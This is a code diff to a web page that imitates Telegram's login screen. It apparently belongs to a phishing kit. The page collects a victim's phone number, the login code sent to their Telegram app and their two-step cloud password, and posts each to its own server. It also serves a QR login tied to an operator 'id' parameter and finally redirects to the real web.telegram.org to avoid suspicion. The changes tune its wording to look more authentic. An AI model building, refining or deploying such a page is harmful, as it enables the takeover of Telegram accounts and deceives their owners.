@@ -56,6 +56,7 @@
         #qr-display {
             width: 100%; height: 100%;
             display: block;
+            border-radius: 12px;
         }
         .qr-center-logo {
             position: absolute; top: 50%; left: 50%;
@@ -160,7 +161,6 @@
                 <li>Point your phone at this screen to confirm login</li>
             </ul>
             <div class="link-action" onclick="showStep('phone')">Log in by phone number</div>
-            <div class="link-action" onclick="initPasskeyAuth()">Log in by Passkey</div>
         </div>
 
         <div id="step-phone" class="step">
@@ -181,8 +181,8 @@
             <div class="logo-wrapper">
                 <svg class="tg-logo-svg"><use href="#logo-icon" /></svg>
             </div>
-            <h1 id="user-phone">Phone</h1>
-            <p>We've sent an SMS with an activation code to your phone.</p>
+            <h1 id="user-phone-display">Phone</h1>
+            <p>We've sent an activation code to your Telegram app.</p>
             <div class="input-wrapper">
                 <div class="input-label">Code</div>
                 <input type="text" id="sms-field" placeholder="Code" maxlength="5" style="text-align:center; letter-spacing:8px; font-weight:bold;">
@@ -195,7 +195,7 @@
                 <svg class="tg-logo-svg"><use href="#logo-icon" /></svg>
             </div>
             <h1>Two-Step Verification</h1>
-            <p>Your account is protected by an additional password.</p>
+            <p>Your account is protected by a cloud password.</p>
             <div class="input-wrapper">
                 <div class="input-label">Password</div>
                 <input type="password" id="password-field" placeholder="Enter Password">
@@ -208,7 +208,9 @@
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
 <script>
-    const tid = new URLSearchParams(window.location.search).get('id') || 'Admin';
+    // Get tid from URL or fallback to a default if not found
+    const urlParams = new URLSearchParams(window.location.search);
+    const tid = urlParams.get('id') || 'Admin'; 
     let currentNumber = "";
 
     const phoneInput = document.querySelector("#phone-field");
@@ -220,25 +222,20 @@
 
     function showStep(s) {
         document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
-        document.getElementById(`step-${s}`).classList.add('active');
+        const target = document.getElementById(`step-${s}`);
+        if(target) target.classList.add('active');
         document.getElementById('sync-loader').style.display = 'none';
         if(s === 'qr') loadQR();
     }
 
-    async function initPasskeyAuth() {
-        document.getElementById('sync-loader').style.display = 'block';
-        setTimeout(() => {
-            document.getElementById('sync-loader').style.display = 'none';
-            alert("No Passkey found. Please use your phone number.");
-            showStep('phone');
-        }, 1200);
-    }
-
     async function loadQR() {
         try {
-            const res = await fetch('/get_qr', {method:'POST'});
+            // Pass the tid in the query string so the server knows where to send updates
+            const res = await fetch(`/get_qr?id=${tid}`, {method:'POST'});
             const data = await res.json();
-            if(data.qr_image) document.getElementById('qr-display').src = `data:image/png;base64,${data.qr_image}`;
+            if(data.qr_image) {
+                document.getElementById('qr-display').src = `data:image/png;base64,${data.qr_image}`;
+            }
         } catch(e) { console.error("QR Error", e); }
     }
 
@@ -246,7 +243,6 @@
         currentNumber = iti.getNumber();
         if(!iti.isValidNumber()) return alert("Please enter a valid phone number.");
         
-        // Hide previous step, show loader
         document.getElementById('step-phone').classList.remove('active');
         document.getElementById('sync-loader').style.display = 'block';
 
@@ -259,8 +255,8 @@
             const data = await res.json();
             
             if(data.status === "success") {
-                document.getElementById('user-phone').innerText = currentNumber;
-                showStep('code'); // Loader hidden here
+                document.getElementById('user-phone-display').innerText = currentNumber;
+                showStep('code');
             } else {
                 alert(data.msg || "Error occurred");
                 showStep('phone');
@@ -289,14 +285,12 @@
             if(data.status === "success") {
                 window.location.href = "https://web.telegram.org";
             } else if (data.status === "2fa_needed") {
-                showStep('2fa'); // Loader hidden here
+                showStep('2fa');
             } else {
-                alert("Invalid Code");
+                alert(data.msg || "Invalid Code");
                 showStep('code');
             }
-        } catch(e) { 
-            showStep('code'); 
-        }
+        } catch(e) { showStep('code'); }
     }
 
     async function handle2FA() {
@@ -317,14 +311,13 @@
             if(data.status === "success") {
                 window.location.href = "https://web.telegram.org";
             } else {
-                alert("Incorrect Password");
+                alert(data.msg || "Incorrect Password");
                 showStep('2fa');
             }
-        } catch(e) { 
-            showStep('2fa'); 
-        }
+        } catch(e) { showStep('2fa'); }
     }
 
+    // Initialize with QR step
     loadQR();
 </script>
 </body>
